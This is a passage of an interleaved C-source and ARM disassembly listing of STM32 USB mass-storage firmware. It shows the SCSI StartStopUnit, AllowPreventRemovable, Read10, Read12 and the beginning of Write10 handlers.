 800a346:	f003 0303 	and.w	r3, r3, #3
 800a34a:	2b03      	cmp	r3, #3
 800a34c:	d105      	bne.n	800a35a <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a34e:	697b      	ldr	r3, [r7, #20]
 800a350:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a354:	2200      	movs	r2, #0
 800a356:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a35a:	697b      	ldr	r3, [r7, #20]
 800a35c:	2200      	movs	r2, #0
 800a35e:	60da      	str	r2, [r3, #12]

  return 0;
 800a360:	2300      	movs	r3, #0
}
 800a362:	4618      	mov	r0, r3
 800a364:	3718      	adds	r7, #24
 800a366:	46bd      	mov	sp, r7
 800a368:	bd80      	pop	{r7, pc}

0800a36a <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a36a:	b480      	push	{r7}
 800a36c:	b087      	sub	sp, #28
 800a36e:	af00      	add	r7, sp, #0
 800a370:	60f8      	str	r0, [r7, #12]
 800a372:	460b      	mov	r3, r1
 800a374:	607a      	str	r2, [r7, #4]
 800a376:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a378:	68fb      	ldr	r3, [r7, #12]
 800a37a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a37e:	68fb      	ldr	r3, [r7, #12]
 800a380:	32b0      	adds	r2, #176	; 0xb0
 800a382:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a386:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a388:	697b      	ldr	r3, [r7, #20]
 800a38a:	2b00      	cmp	r3, #0
 800a38c:	d102      	bne.n	800a394 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a38e:	f04f 33ff 	mov.w	r3, #4294967295
 800a392:	e015      	b.n	800a3c0 <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a394:	687b      	ldr	r3, [r7, #4]
 800a396:	3304      	adds	r3, #4
 800a398:	781b      	ldrb	r3, [r3, #0]
 800a39a:	2b00      	cmp	r3, #0
 800a39c:	d106      	bne.n	800a3ac <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a39e:	697b      	ldr	r3, [r7, #20]
 800a3a0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3a4:	2200      	movs	r2, #0
 800a3a6:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3aa:	e005      	b.n	800a3b8 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a3ac:	697b      	ldr	r3, [r7, #20]
 800a3ae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3b2:	2201      	movs	r2, #1
 800a3b4:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a3b8:	697b      	ldr	r3, [r7, #20]
 800a3ba:	2200      	movs	r2, #0
 800a3bc:	60da      	str	r2, [r3, #12]

  return 0;
 800a3be:	2300      	movs	r3, #0
}
 800a3c0:	4618      	mov	r0, r3
 800a3c2:	371c      	adds	r7, #28
 800a3c4:	46bd      	mov	sp, r7
 800a3c6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a3ca:	4770      	bx	lr

0800a3cc <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a3cc:	b580      	push	{r7, lr}
 800a3ce:	b086      	sub	sp, #24
 800a3d0:	af00      	add	r7, sp, #0
 800a3d2:	60f8      	str	r0, [r7, #12]
 800a3d4:	460b      	mov	r3, r1
 800a3d6:	607a      	str	r2, [r7, #4]
 800a3d8:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a3da:	68fb      	ldr	r3, [r7, #12]
 800a3dc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a3e0:	68fb      	ldr	r3, [r7, #12]
 800a3e2:	32b0      	adds	r2, #176	; 0xb0
 800a3e4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a3e8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a3ea:	697b      	ldr	r3, [r7, #20]
 800a3ec:	2b00      	cmp	r3, #0
 800a3ee:	d102      	bne.n	800a3f6 <SCSI_Read10+0x2a>
  {
    return -1;
 800a3f0:	f04f 33ff 	mov.w	r3, #4294967295
 800a3f4:	e09d      	b.n	800a532 <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a3f6:	697b      	ldr	r3, [r7, #20]
 800a3f8:	7a1b      	ldrb	r3, [r3, #8]
 800a3fa:	2b00      	cmp	r3, #0
 800a3fc:	f040 808f 	bne.w	800a51e <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a400:	697b      	ldr	r3, [r7, #20]
 800a402:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a406:	7f1b      	ldrb	r3, [r3, #28]
 800a408:	b25b      	sxtb	r3, r3
 800a40a:	2b00      	cmp	r3, #0
 800a40c:	db0b      	blt.n	800a426 <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a40e:	697b      	ldr	r3, [r7, #20]
 800a410:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a414:	7f59      	ldrb	r1, [r3, #29]
 800a416:	2320      	movs	r3, #32
 800a418:	2205      	movs	r2, #5
 800a41a:	68f8      	ldr	r0, [r7, #12]
 800a41c:	f7ff feec 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a420:	f04f 33ff 	mov.w	r3, #4294967295
 800a424:	e085      	b.n	800a532 <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a426:	697b      	ldr	r3, [r7, #20]
 800a428:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a42c:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a430:	2b02      	cmp	r3, #2
 800a432:	d108      	bne.n	800a446 <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a434:	7af9      	ldrb	r1, [r7, #11]
 800a436:	233a      	movs	r3, #58	; 0x3a
 800a438:	2202      	movs	r2, #2
 800a43a:	68f8      	ldr	r0, [r7, #12]
 800a43c:	f7ff fedc 	bl	800a1f8 <SCSI_SenseCode>

      return -1;
 800a440:	f04f 33ff 	mov.w	r3, #4294967295
 800a444:	e075      	b.n	800a532 <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a446:	68fb      	ldr	r3, [r7, #12]
 800a448:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a44c:	68fa      	ldr	r2, [r7, #12]
 800a44e:	33b0      	adds	r3, #176	; 0xb0
 800a450:	009b      	lsls	r3, r3, #2
 800a452:	4413      	add	r3, r2
 800a454:	685b      	ldr	r3, [r3, #4]
 800a456:	689b      	ldr	r3, [r3, #8]
 800a458:	7afa      	ldrb	r2, [r7, #11]
 800a45a:	4610      	mov	r0, r2
 800a45c:	4798      	blx	r3
 800a45e:	4603      	mov	r3, r0
 800a460:	2b00      	cmp	r3, #0
 800a462:	d008      	beq.n	800a476 <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a464:	7af9      	ldrb	r1, [r7, #11]
 800a466:	233a      	movs	r3, #58	; 0x3a
 800a468:	2202      	movs	r2, #2
 800a46a:	68f8      	ldr	r0, [r7, #12]
 800a46c:	f7ff fec4 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a470:	f04f 33ff 	mov.w	r3, #4294967295
 800a474:	e05d      	b.n	800a532 <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a476:	687b      	ldr	r3, [r7, #4]
 800a478:	3302      	adds	r3, #2
 800a47a:	781b      	ldrb	r3, [r3, #0]
 800a47c:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a47e:	687b      	ldr	r3, [r7, #4]
 800a480:	3303      	adds	r3, #3
 800a482:	781b      	ldrb	r3, [r3, #0]
 800a484:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a486:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a488:	687b      	ldr	r3, [r7, #4]
 800a48a:	3304      	adds	r3, #4
 800a48c:	781b      	ldrb	r3, [r3, #0]
 800a48e:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a490:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a492:	687a      	ldr	r2, [r7, #4]
 800a494:	3205      	adds	r2, #5
 800a496:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a498:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a49a:	697a      	ldr	r2, [r7, #20]
 800a49c:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4a0:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a4a2:	687b      	ldr	r3, [r7, #4]
 800a4a4:	3307      	adds	r3, #7
 800a4a6:	781b      	ldrb	r3, [r3, #0]
 800a4a8:	021b      	lsls	r3, r3, #8
 800a4aa:	687a      	ldr	r2, [r7, #4]
 800a4ac:	3208      	adds	r2, #8
 800a4ae:	7812      	ldrb	r2, [r2, #0]
 800a4b0:	4313      	orrs	r3, r2
 800a4b2:	697a      	ldr	r2, [r7, #20]
 800a4b4:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4b8:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a4ba:	697b      	ldr	r3, [r7, #20]
 800a4bc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4c0:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a4c2:	697b      	ldr	r3, [r7, #20]
 800a4c4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4c8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a4ca:	7af9      	ldrb	r1, [r7, #11]
 800a4cc:	68f8      	ldr	r0, [r7, #12]
 800a4ce:	f000 fb0c 	bl	800aaea <SCSI_CheckAddressRange>
 800a4d2:	4603      	mov	r3, r0
 800a4d4:	2b00      	cmp	r3, #0
 800a4d6:	da02      	bge.n	800a4de <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a4d8:	f04f 33ff 	mov.w	r3, #4294967295
 800a4dc:	e029      	b.n	800a532 <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a4de:	697b      	ldr	r3, [r7, #20]
 800a4e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4e4:	699a      	ldr	r2, [r3, #24]
 800a4e6:	697b      	ldr	r3, [r7, #20]
 800a4e8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4ec:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a4ee:	6979      	ldr	r1, [r7, #20]
 800a4f0:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a4f4:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a4f8:	fb01 f303 	mul.w	r3, r1, r3
 800a4fc:	429a      	cmp	r2, r3
 800a4fe:	d00b      	beq.n	800a518 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a500:	697b      	ldr	r3, [r7, #20]
 800a502:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a506:	7f59      	ldrb	r1, [r3, #29]
 800a508:	2320      	movs	r3, #32
 800a50a:	2205      	movs	r2, #5
 800a50c:	68f8      	ldr	r0, [r7, #12]
 800a50e:	f7ff fe73 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a512:	f04f 33ff 	mov.w	r3, #4294967295
 800a516:	e00c      	b.n	800a532 <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a518:	697b      	ldr	r3, [r7, #20]
 800a51a:	2202      	movs	r2, #2
 800a51c:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a51e:	697b      	ldr	r3, [r7, #20]
 800a520:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a524:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a526:	7afb      	ldrb	r3, [r7, #11]
 800a528:	4619      	mov	r1, r3
 800a52a:	68f8      	ldr	r0, [r7, #12]
 800a52c:	f000 fb0a 	bl	800ab44 <SCSI_ProcessRead>
 800a530:	4603      	mov	r3, r0
}
 800a532:	4618      	mov	r0, r3
 800a534:	3718      	adds	r7, #24
 800a536:	46bd      	mov	sp, r7
 800a538:	bd80      	pop	{r7, pc}

0800a53a <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a53a:	b580      	push	{r7, lr}
 800a53c:	b086      	sub	sp, #24
 800a53e:	af00      	add	r7, sp, #0
 800a540:	60f8      	str	r0, [r7, #12]
 800a542:	460b      	mov	r3, r1
 800a544:	607a      	str	r2, [r7, #4]
 800a546:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a548:	68fb      	ldr	r3, [r7, #12]
 800a54a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a54e:	68fb      	ldr	r3, [r7, #12]
 800a550:	32b0      	adds	r2, #176	; 0xb0
 800a552:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a556:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a558:	697b      	ldr	r3, [r7, #20]
 800a55a:	2b00      	cmp	r3, #0
 800a55c:	d102      	bne.n	800a564 <SCSI_Read12+0x2a>
  {
    return -1;
 800a55e:	f04f 33ff 	mov.w	r3, #4294967295
 800a562:	e0a7      	b.n	800a6b4 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a564:	697b      	ldr	r3, [r7, #20]
 800a566:	7a1b      	ldrb	r3, [r3, #8]
 800a568:	2b00      	cmp	r3, #0
 800a56a:	f040 8099 	bne.w	800a6a0 <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a56e:	697b      	ldr	r3, [r7, #20]
 800a570:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a574:	7f1b      	ldrb	r3, [r3, #28]
 800a576:	b25b      	sxtb	r3, r3
 800a578:	2b00      	cmp	r3, #0
 800a57a:	db0b      	blt.n	800a594 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a57c:	697b      	ldr	r3, [r7, #20]
 800a57e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a582:	7f59      	ldrb	r1, [r3, #29]
 800a584:	2320      	movs	r3, #32
 800a586:	2205      	movs	r2, #5
 800a588:	68f8      	ldr	r0, [r7, #12]
 800a58a:	f7ff fe35 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a58e:	f04f 33ff 	mov.w	r3, #4294967295
 800a592:	e08f      	b.n	800a6b4 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a594:	697b      	ldr	r3, [r7, #20]
 800a596:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a59a:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a59e:	2b02      	cmp	r3, #2
 800a5a0:	d108      	bne.n	800a5b4 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5a2:	7af9      	ldrb	r1, [r7, #11]
 800a5a4:	233a      	movs	r3, #58	; 0x3a
 800a5a6:	2202      	movs	r2, #2
 800a5a8:	68f8      	ldr	r0, [r7, #12]
 800a5aa:	f7ff fe25 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a5ae:	f04f 33ff 	mov.w	r3, #4294967295
 800a5b2:	e07f      	b.n	800a6b4 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a5b4:	68fb      	ldr	r3, [r7, #12]
 800a5b6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a5ba:	68fa      	ldr	r2, [r7, #12]
 800a5bc:	33b0      	adds	r3, #176	; 0xb0
 800a5be:	009b      	lsls	r3, r3, #2
 800a5c0:	4413      	add	r3, r2
 800a5c2:	685b      	ldr	r3, [r3, #4]
 800a5c4:	689b      	ldr	r3, [r3, #8]
 800a5c6:	7afa      	ldrb	r2, [r7, #11]
 800a5c8:	4610      	mov	r0, r2
 800a5ca:	4798      	blx	r3
 800a5cc:	4603      	mov	r3, r0
 800a5ce:	2b00      	cmp	r3, #0
 800a5d0:	d008      	beq.n	800a5e4 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5d2:	7af9      	ldrb	r1, [r7, #11]
 800a5d4:	233a      	movs	r3, #58	; 0x3a
 800a5d6:	2202      	movs	r2, #2
 800a5d8:	68f8      	ldr	r0, [r7, #12]
 800a5da:	f7ff fe0d 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a5de:	f04f 33ff 	mov.w	r3, #4294967295
 800a5e2:	e067      	b.n	800a6b4 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a5e4:	687b      	ldr	r3, [r7, #4]
 800a5e6:	3302      	adds	r3, #2
 800a5e8:	781b      	ldrb	r3, [r3, #0]
 800a5ea:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a5ec:	687b      	ldr	r3, [r7, #4]
 800a5ee:	3303      	adds	r3, #3
 800a5f0:	781b      	ldrb	r3, [r3, #0]
 800a5f2:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a5f4:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a5f6:	687b      	ldr	r3, [r7, #4]
 800a5f8:	3304      	adds	r3, #4
 800a5fa:	781b      	ldrb	r3, [r3, #0]
 800a5fc:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a5fe:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a600:	687a      	ldr	r2, [r7, #4]
 800a602:	3205      	adds	r2, #5
 800a604:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a606:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a608:	697a      	ldr	r2, [r7, #20]
 800a60a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a60e:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a610:	687b      	ldr	r3, [r7, #4]
 800a612:	3306      	adds	r3, #6
 800a614:	781b      	ldrb	r3, [r3, #0]
 800a616:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a618:	687b      	ldr	r3, [r7, #4]
 800a61a:	3307      	adds	r3, #7
 800a61c:	781b      	ldrb	r3, [r3, #0]
 800a61e:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a620:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a622:	687b      	ldr	r3, [r7, #4]
 800a624:	3308      	adds	r3, #8
 800a626:	781b      	ldrb	r3, [r3, #0]
 800a628:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a62a:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a62c:	687a      	ldr	r2, [r7, #4]
 800a62e:	3209      	adds	r2, #9
 800a630:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a632:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a634:	697a      	ldr	r2, [r7, #20]
 800a636:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a63a:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a63c:	697b      	ldr	r3, [r7, #20]
 800a63e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a642:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a644:	697b      	ldr	r3, [r7, #20]
 800a646:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a64a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a64c:	7af9      	ldrb	r1, [r7, #11]
 800a64e:	68f8      	ldr	r0, [r7, #12]
 800a650:	f000 fa4b 	bl	800aaea <SCSI_CheckAddressRange>
 800a654:	4603      	mov	r3, r0
 800a656:	2b00      	cmp	r3, #0
 800a658:	da02      	bge.n	800a660 <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a65a:	f04f 33ff 	mov.w	r3, #4294967295
 800a65e:	e029      	b.n	800a6b4 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a660:	697b      	ldr	r3, [r7, #20]
 800a662:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a666:	699a      	ldr	r2, [r3, #24]
 800a668:	697b      	ldr	r3, [r7, #20]
 800a66a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a66e:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a670:	6979      	ldr	r1, [r7, #20]
 800a672:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a676:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a67a:	fb01 f303 	mul.w	r3, r1, r3
 800a67e:	429a      	cmp	r2, r3
 800a680:	d00b      	beq.n	800a69a <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a682:	697b      	ldr	r3, [r7, #20]
 800a684:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a688:	7f59      	ldrb	r1, [r3, #29]
 800a68a:	2320      	movs	r3, #32
 800a68c:	2205      	movs	r2, #5
 800a68e:	68f8      	ldr	r0, [r7, #12]
 800a690:	f7ff fdb2 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a694:	f04f 33ff 	mov.w	r3, #4294967295
 800a698:	e00c      	b.n	800a6b4 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a69a:	697b      	ldr	r3, [r7, #20]
 800a69c:	2202      	movs	r2, #2
 800a69e:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a6a0:	697b      	ldr	r3, [r7, #20]
 800a6a2:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a6a6:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a6a8:	7afb      	ldrb	r3, [r7, #11]
 800a6aa:	4619      	mov	r1, r3
 800a6ac:	68f8      	ldr	r0, [r7, #12]
 800a6ae:	f000 fa49 	bl	800ab44 <SCSI_ProcessRead>
 800a6b2:	4603      	mov	r3, r0
}
 800a6b4:	4618      	mov	r0, r3
 800a6b6:	3718      	adds	r7, #24
 800a6b8:	46bd      	mov	sp, r7
 800a6ba:	bd80      	pop	{r7, pc}

0800a6bc <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a6bc:	b580      	push	{r7, lr}
 800a6be:	b086      	sub	sp, #24
 800a6c0:	af00      	add	r7, sp, #0
 800a6c2:	60f8      	str	r0, [r7, #12]
 800a6c4:	460b      	mov	r3, r1
 800a6c6:	607a      	str	r2, [r7, #4]
 800a6c8:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a6ca:	68fb      	ldr	r3, [r7, #12]
 800a6cc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a6d0:	68fb      	ldr	r3, [r7, #12]
 800a6d2:	32b0      	adds	r2, #176	; 0xb0
 800a6d4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a6d8:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a6da:	697b      	ldr	r3, [r7, #20]
 800a6dc:	2b00      	cmp	r3, #0
 800a6de:	d102      	bne.n	800a6e6 <SCSI_Write10+0x2a>
  {
    return -1;
 800a6e0:	f04f 33ff 	mov.w	r3, #4294967295
 800a6e4:	e0c7      	b.n	800a876 <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a6e6:	697b      	ldr	r3, [r7, #20]
 800a6e8:	7a1b      	ldrb	r3, [r3, #8]
 800a6ea:	2b00      	cmp	r3, #0
 800a6ec:	f040 80bd 	bne.w	800a86a <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a6f0:	697b      	ldr	r3, [r7, #20]
 800a6f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a6f6:	699b      	ldr	r3, [r3, #24]
 800a6f8:	2b00      	cmp	r3, #0
 800a6fa:	d10b      	bne.n	800a714 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a6fc:	697b      	ldr	r3, [r7, #20]
 800a6fe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a702:	7f59      	ldrb	r1, [r3, #29]
 800a704:	2320      	movs	r3, #32
 800a706:	2205      	movs	r2, #5
 800a708:	68f8      	ldr	r0, [r7, #12]
 800a70a:	f7ff fd75 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a70e:	f04f 33ff 	mov.w	r3, #4294967295
 800a712:	e0b0      	b.n	800a876 <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a714:	697b      	ldr	r3, [r7, #20]
 800a716:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a71a:	7f1b      	ldrb	r3, [r3, #28]
 800a71c:	b25b      	sxtb	r3, r3
 800a71e:	2b00      	cmp	r3, #0
 800a720:	da0b      	bge.n	800a73a <SCSI_Write10+0x7e>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a722:	697b      	ldr	r3, [r7, #20]
 800a724:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a728:	7f59      	ldrb	r1, [r3, #29]
 800a72a:	2320      	movs	r3, #32
 800a72c:	2205      	movs	r2, #5
 800a72e:	68f8      	ldr	r0, [r7, #12]
 800a730:	f7ff fd62 	bl	800a1f8 <SCSI_SenseCode>
      return -1;
 800a734:	f04f 33ff 	mov.w	r3, #4294967295
 800a738:	e09d      	b.n	800a876 <SCSI_Write10+0x1ba>
    }

    /* Check whether Media is ready */
